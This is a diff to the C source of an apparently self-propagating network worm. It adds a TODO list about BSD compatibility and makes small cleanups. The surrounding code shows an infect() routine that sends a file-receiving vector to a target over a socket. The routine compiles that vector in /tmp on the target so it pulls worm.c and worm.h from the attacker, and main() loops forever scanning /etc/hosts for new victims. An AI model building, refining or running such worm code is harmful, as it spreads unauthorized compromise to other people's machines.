@@ -1,3 +1,12 @@
+/*
+TODO:
+- make sure the "&" command actually runs the compiled programs (could use "./" instead?)
+- test this program at all...
+- ensure that the correct BSD versions of the files are being pulled in
+- convert this file to old C so that this can be ran on BSD systems
+*/
+
+
 #include "worm.h"
 #include <sys/types.h>
 #include <sys/wait.h>
@@ -150,7 +159,6 @@ void infect(char *ip, char *my_ip) {
 	char cmd_buf[IO_BUF_SIZE] = {0};
 	FILE *fp;
 	int file_size;
-	int bytes_read;
 
 	printf("[*] Attempting to infect: %s\n", ip);
 	fflush(stdout);
@@ -190,7 +198,7 @@ void infect(char *ip, char *my_ip) {
 	// Send receive_file_bsd.c (vector) over
 	deploy_receive_file(sock, my_ip);
 
-    // Compile and run receive_file, should pull in worm.c and worm.h from attakcer
+    // Compile and run receive_file, should pull in worm.c and worm.h from attacker
 	printf("[*] Compiling receive_file.c on target...\n");
 	write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
 	sleep(2);
@@ -228,7 +236,7 @@ int main() {
 	printf("[*] Worm Started on IP: %s\n", my_ip);
 	fflush(stdout);
 
-	/* Infinite loop for continuous propagation */
+	/* The main infinite loop */
 	while (1) {
 		printf("\n[*] Scanning /etc/hosts for targets...\n");
 		fflush(stdout);
